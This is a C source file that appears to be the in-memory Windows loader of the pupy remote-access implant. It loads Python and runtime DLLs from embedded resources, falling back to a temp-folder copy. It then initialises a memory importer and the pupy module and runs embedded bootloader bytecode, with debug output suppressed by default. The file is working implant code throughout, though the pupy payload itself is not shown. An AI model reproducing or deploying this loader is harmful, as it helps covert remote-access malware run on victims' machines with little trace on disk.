#define QUIET // uncomment to avoid debug prints
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "pupy_load.h"
#include "Python-dynload.h"
#include "actctx.h"
#include "resource_python_manifest.c"
#include "base_inject.h"


HANDLE MyActCtx;
static ULONG_PTR actToken;

extern const char resources_python27_dll_start[];
extern const int resources_python27_dll_size;
extern const char resources_bootloader_pyc_start[];
extern const int resources_bootloader_pyc_size;
extern const char resources_msvcr90_dll_start[];
extern const int resources_msvcr90_dll_size;
extern const char resource_python_manifest[];

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

CRITICAL_SECTION csInit; // protecting our init code

// Simple trick to get the current pupy arch
#ifdef _WIN64
	const DWORD dwPupyArch = PROCESS_ARCH_X64;
#else
	const DWORD dwPupyArch = PROCESS_ARCH_X86;
#endif


DWORD WINAPI mainThread(LPVOID lpArg)
{

	int rc = 0;
	PyObject *m=NULL, *d=NULL, *seq=NULL;
	PyObject *mod;
	char * ppath;
	FILE * f;
	char tmp_python_dll_path[MAX_PATH];
	char tmp_manifest_path[MAX_PATH];
	char tmp_path[MAX_PATH];
	ULONG_PTR cookie = 0;
	/*
	ACTCTX ctx;
	BOOL activated;
	HANDLE k32;
	HANDLE (WINAPI *CreateActCtx)(PACTCTX pActCtx);
	BOOL (WINAPI *ActivateActCtx)(HANDLE hActCtx, ULONG_PTR *lpCookie);
	void (WINAPI *AddRefActCtx)(HANDLE hActCtx);
	BOOL (WINAPI *DeactivateActCtx)(DWORD dwFlags, ULONG_PTR ulCookie);
	*/
	PyGILState_STATE restore_state;

	if(!GetModuleHandle("msvcr90.dll")){
		#ifndef QUIET
		fprintf(stderr,"loading msvcr90.dll\n");
		#endif
		_load_msvcr90(resources_msvcr90_dll_start);
	}
	else{
		#ifndef QUIET
		fprintf(stderr,"msvcr90.dll already loaded\n");
		#endif
	}

	GetTempPath(MAX_PATH, tmp_path);
	//InitializeCriticalSection(&csInit);
	/*	
	k32 = LoadLibrary("kernel32");
	CreateActCtx = (void*)GetProcAddress(k32, "CreateActCtxA");
	ActivateActCtx = (void*)GetProcAddress(k32, "ActivateActCtx");
	AddRefActCtx = (void*)GetProcAddress(k32, "AddRefActCtx");
	DeactivateActCtx = (void*)GetProcAddress(k32, "DeactivateActCtx");


	if (!CreateActCtx || !ActivateActCtx)
	{
		return 0;
	}

	ZeroMemory(&ctx, sizeof(ctx));
	ctx.cbSize = sizeof(ACTCTX);
	GetTempFileName(tmp_path, "tmp", 0, tmp_manifest_path);


	f=fopen(tmp_manifest_path,"w");
	fprintf(f,"%s",resource_python_manifest);
	fclose(f);
	#ifndef QUIET
	fprintf(stderr,"manifest written to %s\n",tmp_manifest_path);
	#endif
	ctx.lpSource = tmp_manifest_path;

	MyActCtx=CreateActCtx(&ctx);
	if (MyActCtx != NULL)
	{
		AddRefActCtx(MyActCtx);
	}
	#ifndef QUIET
	DeleteFile(tmp_manifest_path);
	#endif
	*/	

	if(!Py_IsInitialized)
	{
		int res=0;
		//activated = ActivateActCtx(MyActCtx, &actToken);
		//cookie=_My_ActivateActCtx();
		if(GetModuleHandle("python27.dll")){
			HANDLE hp;
			#ifndef QUIET
			fprintf(stderr,"python27.dll is already loaded\n");
			#endif
			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
		}
		else{
			if(!_load_python("python27.dll", resources_python27_dll_start)){
				#ifndef QUIET
				fprintf(stderr,"loading python27.dll from memory failed\n");
				#endif

				//if loading from memory fail, we write dll on disk
				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);

				f=fopen(tmp_python_dll_path,"wb");
				res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
				fclose(f);

				if(!_load_python(tmp_python_dll_path, NULL)){
					if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
						#ifndef QUIET
						fprintf(stderr,"could not load python dll\n");
						#endif
					}
				}
			}
		#ifndef QUIET
		fprintf(stderr,"python interpreter loaded\n");
		#endif
		}
		//_My_DeactivateActCtx(cookie);
	}
	#ifndef QUIET
	fprintf(stderr,"calling PyEval_InitThreads() ...\n");
	#endif
	PyEval_InitThreads();
	#ifndef QUIET
	fprintf(stderr,"PyEval_InitThreads() called\n");
	#endif
	if(!Py_IsInitialized()){
		ppath = Py_GetPath();
		strcpy(ppath, "\x00");

		Py_IgnoreEnvironmentFlag = 1;
		Py_NoSiteFlag = 1; /* remove site.py auto import */
		Py_Initialize();

		#ifndef QUIET
		fprintf(stderr,"Py_Initialize()\n");
		#endif
		PySys_SetObject("frozen", PyBool_FromLong(1));
	}
	restore_state=PyGILState_Ensure();

	init_memimporter();
	#ifndef QUIET
	fprintf(stderr,"init_memimporter()\n");
	#endif
	initpupy();
	#ifndef QUIET
	fprintf(stderr,"initpupy()\n");
	#endif

	//mod = PyImport_ImportModule("sys");

	//MessageBoxA(0, "hey ! :D", "DLL Message", MB_OK | MB_ICONINFORMATION);

	/* We execute then in the context of '__main__' */
	#ifndef QUIET
	fprintf(stderr,"starting evaluating python code ...\n");
	#endif
	//PyRun_SimpleString("print 'ok from python'");
	m = PyImport_AddModule("__main__");
	if (m) d = PyModule_GetDict(m);
	if (d) seq = PyMarshal_ReadObjectFromString(resources_bootloader_pyc_start, resources_bootloader_pyc_size);
	if (seq) {
		Py_ssize_t i, max = PySequence_Length(seq);
		for (i=0;i<max;i++) {
			PyObject *sub = PySequence_GetItem(seq, i);
			if (seq) {
				PyObject *discard = PyEval_EvalCode((PyCodeObject *)sub, d, d);
				if (!discard) {
					PyErr_Print();
					rc = 255;
				}
				Py_XDECREF(discard);
				/* keep going even if we fail */
			}
			Py_XDECREF(sub);
		}
	}
	PyGILState_Release(restore_state);
	//if (PyErr_Occurred())
	//   PyErr_Print();
	Py_Finalize();
	/*
	if (!DeactivateActCtx(0, actToken)){
	#ifndef QUIET
		fprintf(stderr,"LOADER: Error deactivating context!\n!");
	#endif
	}
	*/
	//DeleteCriticalSection(&csInit);

	return 0;
}

